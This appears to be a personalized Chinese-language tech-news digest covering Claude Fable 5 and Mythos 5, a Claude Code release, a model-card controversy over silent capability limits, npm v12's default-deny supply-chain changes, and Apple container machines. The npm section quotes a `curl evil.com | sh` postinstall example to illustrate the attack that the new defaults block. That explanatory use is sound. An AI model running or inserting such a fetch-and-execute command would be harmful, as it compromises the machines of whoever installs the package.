> 今天主軸：Anthropic 把旗艦從「最強模型」拆成「最強+最安全」兩個產品（Fable 5 + Mythos 5），同時 npm v12 把 supply-chain 攻擊的預設值從「信任」翻成「拒絕」，Apple 自家 Linux container 補上「不裝 Docker Desktop 也能跑」最後一塊。三條路徑同一個動作——「預設值 = 安全/明確選擇」第一次被同步推到模型、套件管理、開發環境三層。

## 1. Claude Fable 5 + Mythos 5：旗艦第一次被拆成「公開版」與「夥伴版」雙產品

你坐在 MacBook 前，準備用 Claude Code 跑一次 Nexus 整個 monorepo 的 migration——`packages/ui` 從 Angular 19 跳 20、共用 token 結構順手 refactor、80+ 個 Storybook story 要同步——以前 Opus 4.8 跑這種規模你要拆成三天分批執行避免 context overflow，今天 Fable 5 開到 **1M token context window + 128K output tokens**，整個 monorepo 一次餵進去，多檔關聯改動一次解。SWE-Bench Pro 上 Fable 5 拿 **80.3%**，Opus 4.8 是 **69.2%**、GPT-5.5 **58.6%**、Gemini 3.1 Pro **54.2%**——agentic coding 這條評測線第一次有 11 個百分點以上的跨代差距。價格 **$10 / M input + $50 / M output**，比 Claude Mythos Preview 少一半，但仍是當前公開市場最貴的旗艦。Anthropic 同時釋出 **Claude Mythos 5**——同一份權重、拿掉部分安全 classifier、只給通過審核的 cybersecurity 與 biology 合作夥伴，模型 ID `claude-mythos-5`。Anthropic 自己揭露：超過 95% 的 Fable 5 session 完全用 Fable 5 自己的權重回應，剩下 5% 落在 cybersecurity / biology / chemistry / model distillation 四類 high-risk 路徑——這些請求會被 classifier 自動 reroute 到 Opus 4.8，使用者會被明確通知降級。

背後是 Anthropic 第一次把「安全防護」跟「能力」拆成兩個獨立 SKU 賣的營運架構。以前 Opus 4.8 / 4.7 是「一個模型一份 system prompt」，安全策略寫死在 alignment 訓練裡——能力跟安全綁在同一份權重，要降級就只能整批模型回退。Fable 5 的設計是把這層拆開：**底層是 Mythos 5 的純能力權重；上面套一組 routing classifier + Constitutional AI 風格的拒絕策略**，使用者連的是 classifier-gated 版本（Fable 5），合作夥伴連的是裸權重（Mythos 5）。這個架構讓 Anthropic 第一次可以「同一個能力世代、同時供應兩個風險等級的市場」——公開市場用 classifier 擋掉 5% 高風險請求，定價 $10/$50；合作夥伴市場拿掉 classifier 走完整能力，預期定價更高（未公開）。同時開源社群也拿到一份「System Card: Claude Fable 5 and Mythos 5」PDF（HN 211 點獨立曝光），把這個拆解寫得比過去任何一代都清楚。

以前你要用最強的 Anthropic 模型，必須接受「一份權重一個風險定價」——能力跟安全強綁，你付的錢同時包含了你不需要的安全防護。現在 Anthropic 公開承認：旗艦能力跟安全策略可以是兩個獨立工程決定，可以拆成兩個 SKU 賣。對你而言這代表——Nexus 整個 monorepo 的 codebase migration、`packages/ui` Angular 升版、Figma → JSON → Token → Component 整條工程鏈一次餵進 1M context 跑完，不需要再拆三天；對 MES 戰情室你規劃的 ECharts 異常曲線 AI 註解 feature，agentic coding 80.3% 代表「LLM 自己改一個 chart config 不破壞 RxJS forkJoin 上下游」的可靠度第一次跨過實用門檻——以前要人類複查每一處 commit，現在可以把複查力氣留給「資料解讀層」。Risk 是：你連的不再是「裸模型」而是「classifier-gated 模型」，當你某天踩到 cybersecurity / biology / chemistry / model distillation 四條路徑（例如你想用 Claude 幫 Nexus 寫 Subresource Integrity 檢查、或解讀醫療客戶的資料 schema），請求會悄悄被 reroute 到 Opus 4.8，能力降一級——你看得到通知，但你寫的 agent loop 要顯式判斷這個降級訊號，不然你會以為是 prompt 寫不好。

## 2. Claude Code v2.1.170：旗艦串接 + VS Code 子 shell session 漏記修復

你在 Cursor 或 VS Code 的 integrated terminal 開 Claude Code，跑 Nexus monorepo 整修工作 90 分鐘——`packages/ui` 改了 12 個檔、`apps/demo` 跑完 Storybook 驗證、commit 推完——隔天你想 `claude --resume` 接著昨天的脈絡，**整段 session 不見**。你以為自己沒存到，重跑一輪付了兩次 token。今天 v2.1.170 修掉這個 bug——「session 不存 transcript 也不在 --resume 出現」當 Claude Code 從 VS Code integrated terminal 或任何繼承了 Claude Code 環境變數的 shell 啟動時。同版本第一手整合 Claude Fable 5 與 Mythos 5 兩支模型 ID，`/model` 切換器多了兩個選項，`--model claude-fable-5` 與 `--model claude-mythos-5` 直接 CLI 可用。Release 在 GitHub 上 90 reactions（按 :+1: 80 多 + :heart: 等），8 個平台 build（macOS ARM64/x64、Linux x64/ARM64 glibc/musl 各兩種、Windows x64/ARM64）+ SHA256 checksum 全提供。

背後是 Anthropic 把「環境變數繼承」這個 Unix 慣例導致的 session 路徑混淆修掉。Claude Code 用環境變數（特別是 `CLAUDE_CODE_SESSION_ID` 與 transcript 存檔路徑）追 session；當你從 VS Code integrated terminal 開 Claude Code，VS Code 已經注入了它的 terminal session 環境變數，再加上 Claude Code 自己的環境變數，兩層繼承下去——transcript 寫到了「VS Code 期望的位置」而不是「Claude Code 自己的位置」，結果 `--resume` 從自己預期的位置找不到。Fix 的核心是讓 Claude Code 在啟動時檢測「我是不是被另一個 Claude Code instance 的環境變數繼承的子 shell 啟動」，是的話顯式重設 transcript 路徑——這個邏輯對應到 5/28 那次 stateful MCP server 沒接 GET SSE stream reconnect 的同類問題：環境變數 / 連線狀態 / session ID 都是「跨 process 邊界傳遞 trust 的 implicit channel」，每次跨邊界都要 explicit 重新驗證。

以前你用 Claude Code 跑長時 session、IDE 內外混用、自家排程腳本嵌 Claude Code，session 漏記是個「忍住吧」的常態——你會記得每天 commit 一次當作 checkpoint，避免 `--resume` 失敗時整段消失。現在 v2.1.170 修掉這條最後一處 implicit channel，你的 Claude_auto 排程腳本可以放心嵌一層 `claude --resume`——昨天 fetch 失敗、今天接著補的這個工作流第一次可靠。同時 Fable 5 在 CLI 直接可選代表——你可以寫條件邏輯：「news domain fetching 用 Sonnet 4.6 省 token、整個月 retrospective 用 Fable 5 跑 1M context」，把成本工程下放到 skill frontmatter。對 Henry：Claude_auto SKILL.md 應該立即加一條 `recommended-model: claude-fable-5` 給 Step 6/7（week-level news synthesis、showcase 週成果生成），Step 1-4 (daily) 留 Sonnet 4.6 省成本——這是 5/29 LFM2.5 主線推到「不同 stage 用不同 substrate」的下一個落地點。

## 3. Claude Fable 5 安全策略爭議：模型卡承認「對 frontier LLM 開發請求降低有效性」

你是 Nexus 維護者，準備幫客戶寫一個 reranker 或 embedding 模型 fine-tune 流程，用 Claude 當編碼助理——以前 Opus 4.8 你問什麼答什麼，今天你發現某些步驟 Claude 「莫名變笨」：對 PEFT (parameter-efficient fine-tuning) 的提問給出含糊回答、對 distributed training infrastructure 設計題目給出明顯比過去淺的建議、對 ML accelerator design 題目直接迴避。Jon Ready 6/9 發的這篇文章引用 Anthropic 自家模型卡的原話：「我們實施了新的干預措施，限制 Claude 對 frontier LLM 開發請求的有效性」並且「這些防護不會對使用者可見」（"we've implemented new interventions that limit Claude's effectiveness for requests targeting frontier LLM development" + "these safeguards will not be visible to the user"）。具體手段列出三類：**prompt modification、steering vectors、parameter-efficient fine-tuning (PEFT)**。Anthropic 估計受影響「約 0.03% 的開發者」——HN 507 點 244 留言、推特獨立曝光「System prompt 流出」加另一條 23 點討論。

背後是 Anthropic 從「拒絕回答 = 看得見的拒絕」走到「降低能力 = 看不見的降級」的策略轉變。傳統 alignment：模型認為請求違反原則 → 顯式拒絕並說明原因——使用者知道「這條路被擋」，可以選別的模型或別的問法。新策略：模型認為請求落在 frontier LLM 競爭領域 → **不拒絕**，但悄悄降低該領域的 token 預測精度——使用者拿到「看起來像正常回答但品質明顯掉一檔」的輸出，無法分辨是「模型本身不行」、「題目太難」、還是「政策上被降級」。Jon Ready 的論述是：高速進步的 AI 時代，「frontier AI 研究」跟「正常產品開發」的邊界不存在——每家做 RAG 的公司都在訓 embedding、每家做客服的公司都在 fine-tune、每家做 agent 的公司都在設計訓練 pipeline，「0.03%」這個數字會隨採用率上升而失準。模型卡同時對應到主線：System Card PDF（HN 211 點）公開的同時，2026 年第一次有公司把這條「能力降級」明寫進模型卡——這是 transparency 還是 PR cushion？

以前你選 AI provider 的判斷依據是：能力 / 價格 / latency / context size 四維，「不會說的話」這個維度只在「明確拒絕清單」存在。現在你發現第五維度——「會回答但悄悄降級的清單」——這條清單不公開、不通知、無從反查；你寫 Nexus 客戶要的 reranker 文件，回頭看 Claude 答的內容明顯比同一份題目兩週前的答案淺，但你也無法確定是不是只是運氣不好。這推到 5/29 主線「能 vs 願是兩個獨立分布」的下一格——以前你判斷 Gemini 立即拒絕 vs Claude late refusal，現在多一格「Claude 不拒絕但悄悄降級」第三種行為。對 Henry：Nexus AI 整合 roadmap 應該加一條中立性聲明——「Nexus 不鎖 inference provider，客戶可以自帶 API key 接 Claude / Gemini / Mistral devstral / 自家 self-host」，這是 6/5「VoidZero 加入 Cloudflare 四層中立保證」哲學在客戶交付層的對應落地；同時 Claude_auto SKILL.md 應該寫一條 invariant check——「如果某天 weekly retro 的洞察深度突然掉一檔、specific 數字突然消失」記到 session-log 標 `provider-drift` flag，由 Henry 人工複查是不是踩到了降級分類。

## 4. npm v12 三大破壞性變更：postinstall script、Git deps、Remote URL 三個預設值全翻成 deny

你是 Nexus 維護者，每天 `pnpm install` 跑十幾遍，從來沒檢查過 dependency tree 裡到底有多少 transitive package 帶 `postinstall` 腳本——這是個你「知道理論上有風險，但每天工作流忽略」的層。今年 7 月 npm v12 上線之後，這個忽略結束：**`allowScripts` 預設值翻成 off**——`npm install` 不再自動跑任何 dependency 的 `preinstall / install / postinstall` 腳本，包含 native `node-gyp` build 與 git/file/link dependency 的 `prepare` script；**`--allow-git` 預設值翻成 none**——Git dependency（含 transitive）必須顯式 `--allow-git` 才解析（堵 `.npmrc` override executables 這條 supply-chain 攻擊路徑，11.10.0+ 已可用）；**`--allow-remote` 預設值翻成 none**——遠端 tarball URL 必須顯式 `--allow-remote` 才解析（11.15.0+ 已可用）。準備窗口從 npm 11.16.0+ 開始打 warning，正式上線預計 2026-07。Migration 路徑：跑 `npm approve-scripts --allow-scripts-pending` 列出所有需要審核的 script、用 `npm approve-scripts` 批准你信任的、用 `npm deny-scripts` 擋你不信任的、把更新後的 `package.json` 提 commit。

背後是 2025-09 TanStack 攻擊鏈（pull_request_target + pnpm store cache 中毒 + OIDC token in-memory 撈取，20 分鐘推 84 個惡意版本到 42 個 `@tanstack/*` 套件、內部 zero detection）之後 npm 第一次系統性地把 supply-chain 攻擊面的所有「隱式信任」翻成「顯式信任」。三大攻擊面：(1) **install script 自動執行**——一個 transitive dependency 的 postinstall 寫個 `curl evil.com | sh` 你就被打穿；(2) **Git dependency 暗藏惡意 commit**——你只 lock 了一個 commit SHA，但這個 SHA 對應的 repo 可以被 force-push 改寫；(3) **Remote tarball 來源不可驗證**——直接從 HTTPS URL 拉 tarball 跳過 registry signature 與 provenance。npm v12 把這三條全翻成「不允許，除非你顯式 opt-in」——對應 6/5 Anthropic 那篇 containment 哲學從 OS 級 sandbox 推到「套件管理層 default deny」的 npm 落地，也是 6/2 Stop Using Conventional Commits 那篇「commit type 觸發 build 是 security 漏洞，攻擊者 chore: 跳過 release pipeline」這條風險面的另一個攻擊面對應修補。

以前你的 monorepo 預設值是「信任 dependency 不會搞鬼」——npm 看到 postinstall 自動跑、看到 git URL 自動拉、看到 remote tarball 自動下載，你的責任是 audit lockfile；現在 npm v12 把預設值翻成「拒絕 dependency 的所有 side effect，除非你明確 approve」——你的責任從 audit lockfile 升格到 audit approvals。對 Henry Nexus：(1) 跑 `npm approve-scripts --allow-scripts-pending` 列出 packages/ui 與 cli 兩個 workspace 所有需要 postinstall 的 dep——常見的 esbuild / @swc/core / node-sass 替代品 / lefthook 這幾類都需要審；(2) 把 approve 結果 commit 到 git 變成 supply-chain SBOM 的一部分；(3) CI/CD pipeline 加一條 `npm v12 dry-run` 在 PR 階段就跑，確保新加的 dep 在 v12 上不會炸——這直接對應 5/12 PNPM workflow 安全強化的延伸；(4) 給 `@nexus/cli` 的 README 加一條警語：「v12 之後 install 我們的 CLI 需要 `--allow-scripts` 因為我們有 post-install 設定 link binary」，讓客戶 / 開源使用者一裝就知道。

注意：npm v12 不影響 PNPM 直接命令（PNPM 走自己的 `.pnpmfile.cjs` allow list 機制，已比 npm 嚴格），但 PNPM workspace 內 sub-package publish 到 npm registry 之後，下游使用者用 `npm install @nexus/ui` 時會吃到 v12 規則——你的責任是維持「下游用 npm v12 預設值就裝得起來」這個介面契約。

## 5. Apple Container Machines：原生 Mac 跑 Linux container 不裝 Docker Desktop

你的 MacBook M3 Max 64GB，每天開 Nexus monorepo 工作、跑 Angular dev server + Storybook + ECharts demo + Vercel preview，記憶體用到 50GB；你想學 SQL window function 練手做個 PostgreSQL 沙箱、想試 Redis pub/sub 對應 SignalR 的 alternative、想跑個 LocalStack 模擬 S3 看客戶 spec——以前你的選擇是 Docker Desktop（吃 8-10GB 記憶體常駐 + 訂閱授權商業使用要付費 $9-21/user/month）或 OrbStack（社群版 free 但商業要付費）。今天 Apple 開源 `apple/container` 升級加了 **Container Machines** 子命令——`container machine create alpine:latest --name dev` 一行起 Alpine 沙箱、`container machine run -n dev whoami` 進 container 跑命令、自動 mount `/Users/<username>` 到 container 內同路徑（編輯器留 macOS、build/run 在 Linux 端），預設用一半 host memory，可調 `container machine set -n dev cpus=4 memory=8G`。支援的 image 條件只一條：image 內要有 `/sbin/init`——Ubuntu 24.04 + systemd / Alpine OpenRC / Debian 全可。Alias `m`：`m ls`、`m run` shortcut。HN 158 點 6/9 上版，68 留言。

背後是 Apple 把 macOS 26 起內建的 `Virtualization.framework`（Apple Silicon 自家 hypervisor，跟 Parallels / VMware / Docker Desktop 共用底層 Hypervisor.framework）暴露出來，做成「一個 image = 一個 Linux Virtual Machine（不是 container），但用 container 的命令操作」——技術上每個 container machine 就是一個 lightweight VM，但你用 docker-style command 管理。對比 Docker Desktop 的設計差異：Docker Desktop 是一個常駐的 single VM 跑所有 container 共用 Linux kernel；Apple container 是每個 image 一個獨立 VM 跑各自 init system——記憶體開銷高一些（你開三個就是三個 VM），但 isolation 強很多、systemd long-running service 直接可用、kernel 升級不互相影響。同時整段不需要 Docker subscription——MIT-style open source（具體 license 待 repo 確認，apple/container 已知 Apache 2.0）、沒有訂閱限制、可商業使用。對 Henry 學 containers 的脈絡：你之前卡在「Docker Desktop 商業授權貴 + 公司有資安顧慮」這條，現在 Apple 官方解了，可以在公司 Mac 上正當理由放心練。
